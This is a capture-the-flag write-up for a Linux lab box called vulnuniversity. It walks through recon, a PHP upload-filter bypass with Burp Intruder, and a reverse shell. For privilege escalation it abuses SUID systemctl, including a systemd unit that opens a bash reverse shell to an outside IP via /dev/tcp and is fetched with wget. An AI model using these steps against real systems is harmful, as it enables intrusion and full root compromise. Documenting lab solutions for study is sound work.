---
description: '-linux -web -php shell vuln'
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# vulnuniversity-LINUX

\---------------------------------------------------------------------------------------------------------------------

## Used Nmap For Recon

```bash
sudo nmap -v -sV -A -p- -v <ip> 
```

\---------------------------------------------------------------------------------------------------------------------

for brute forcing urls use gobuster&#x20;

```
gobuster dir -u http://10.10.43.195:3333 -w <word list location>
```

then found /internal/ directory

opened it \<IP>:\<port>/internal/

then found an upload thingy

used burp suite to analyze request and found that it uses php

Then downloaded the given php reverse shell\
tried uploading it and used burp suite in this way

action to intruder clicked ADD § around the position file type&#x20;

```
Content-Disposition: form-data; name="file"; filename="shell.§php§"
```

then choose sniper as my attack type then went to payloads then use simple text as your payload type

then added php  then php ,php3 ,php4 ,php5 ,phtml into payload settings simple text(Add seperaretly )

Then start attack and check for which extension it returns success

\---------------------------------------------------------------------------------------------------------------------

Them search for [http://10.10.43.195:3333/internal/uploads/](http://10.10.43.195:3333/internal/uploads/) and run the shell u have uploaded with the extension accepted

then listen on ur kali using defined port in ur reverse shell script

to list all users use cat /etc/passwd then for the txt search cat /home/\<theusername> then ls and cat if txt file is there

\---------------------------------------------------------------------------------------------------------------------

PRIV ESCALATION

lets find some SUID files&#x20;

((In Linux, SUID (set owner userId upon execution) is a particular type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).))

```
find / -user root -perm -4000 -print 2>/dev/null
```

we see /bin/systemctl has SUID so we can use systemcontrol to start our own service

Search gtfo bins then use SUID filter then ctrl+f to search systemctl then we see

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF

------------Change it to------------------------------------------
TF=$(mktemp).service       #NO SPACES HERE
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
------------------------------------------------------------------
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption><p>suid priv esc script</p></figcaption></figure>

we can run this in the victim machine one by one line then at the end check /tmp for a output file then just cat the output file

\---------------------OOOOOOOOOOTHER METHOD---------------------FOR PRIV ESC------------------

In ur kali create a file root.service then add this code to it and save it

```
[Unit]
Description=root

[Service]
Type=Simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.17.112.0/4444 0>&1'

[Install]
WantedBy=multi-user.target

```

then transfer it using a python server&#x20;

From the host

```
sudo python3 -m http.server 80 
```

Then ON VICTIM in tmp folder

```
wget http:/<IP./root.service
```

```
nc -nlvp 4444       //////in my kali
```

then enable the service

```
systemctl enable /tmp/root.service
systemctl start root
```

Then u get reverse shell to your kali and just move to root directory and cat the txt file
